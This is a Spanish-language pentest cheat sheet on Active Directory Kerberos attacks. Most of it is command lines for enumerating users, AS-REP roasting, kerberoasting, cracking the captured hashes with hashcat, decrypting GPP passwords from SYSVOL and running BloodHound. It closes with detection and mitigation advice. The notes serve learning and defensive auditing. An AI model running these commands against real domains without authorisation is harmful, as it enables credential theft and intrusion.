---
title: Enumeración Kerberos — AS-REP, Kerberoast y GPP
tags: [windows, active-directory, kerberos, kerberoasting, gpp]
---

# Enumeración Kerberos: usuarios, tickets y contraseñas

[🇬🇧 English](kerberos-enum.en.md) | **Español**

## 1. Usuarios sin credenciales

```bash
kerbrute userenum -d <domain> --dc <DC_IP> users.txt
nxc smb <DC_IP> -u '' -p '' --users
rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
```

Con una lista de nombres, `kerbrute` distingue «usuario existe» de «no existe» sin bloquear cuentas (si no hay lockout).

## 2. AS-REP Roasting

Cuentas con `DONT_REQ_PREAUTH`: el KDC devuelve un blob cifrado con su contraseña, crackeable offline.

```bash
impacket-GetNPUsers '<domain>/' -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat
nxc ldap <DC_IP> -u '<user>' -p '<pass>' --asreproast asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## 3. Kerberoasting

Cuentas de servicio con SPN: cualquier usuario autenticado pide un TGS y lo crackea offline.

```bash
impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <DC_IP> -request -outputfile tgs.txt
nxc ldap <DC_IP> -u '<user>' -p '<pass>' --kerberoasting tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

El TGS con cifrado RC4 (`0x17`) es el más rápido de romper; AES sigue siendo posible con diccionario. En Sherlocks, un 4769 con `TicketEncryptionType 0x17` desde una cuenta que no debería pedirlo es la firma.

## 4. GPP y credenciales en SYSVOL

```bash
nxc smb <DC_IP> -u '<user>' -p '<pass>' -M gpp_autologin
gpp-decrypt '<cpassword>'
```

`Groups.xml` con `cpassword` es AES con clave pública conocida: descifrado inmediato. Busca también `*.xml` en SYSVOL con `smbclient`.

## 5. BloodHound y siguientes pasos

```bash
bloodhound-python -u '<user>' -p '<password>' -d <domain> -ns <DC_IP> -c All
```

Rutas típicas: `GenericAll` sobre usuario/grupo, `WriteDACL`, `ForceChangePassword`, ACL sobre GPO, sesiones abiertas y Admins locales. De ahí se sale a [AD CS](adcs-esc4-esc1.md), [RBCD](rbcd-s4u2proxy.md) o [gMSA](gmsa-read-key.md).

## 6. Errores típicos

- **`KRB_AP_ERR_SKEW`** → reloj; ver [reloj y Kerberos](../general/kerberos-clock.md).
- **`KDC_ERR_C_PRINCIPAL_UNKNOWN`** en `kerbrute`** → el usuario no existe o el realm está mal escrito.
- **`GetUserSPNs` devuelve 0 cuentas** → no hay SPN o falta autenticación; usa `-dc-ip` y un usuario válido.
- **Hashcat no rompe** → prueba reglas (`-r`) y máscaras antes de listas gigantes.
- **`gpp_autologin` vacío** → el `Groups.xml` ya se limpió; busca en `Policies/` y backups.

## 7. Detección y mitigación

- **4769** con RC4 y `ServiceName` de cuentas de servicio; **4768** con preauth ausente (AS-REP).
- Contraseñas de servicio largas (>25) y rotación; cuentas de servicio con `gMSA`.
- Eliminar `cpassword` de SYSVOL y auditar ACLs con BloodHound de forma periódica.
- Alertar de `kerbrute`-style enumeración: muchos 4768 fallidos en poco tiempo.

MITRE: T1558.003, T1558.004, T1552.006, T1087.002.
